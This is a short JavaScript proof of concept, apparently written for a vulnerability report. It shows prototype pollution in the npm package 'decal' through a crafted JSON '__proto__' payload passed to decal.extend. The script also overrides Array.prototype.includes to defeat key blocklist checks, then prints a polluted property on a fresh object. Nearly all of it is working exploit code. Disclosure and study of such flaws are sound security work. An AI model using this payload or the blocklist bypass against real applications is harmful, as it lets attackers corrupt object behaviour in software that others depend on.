Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const decal = require('decal');
console.log({}.polluted);
const o = JSON.parse('{"__proto__":{"polluted":"yes"}}');
decal.extend({}, true, o);
console.log({}.polluted);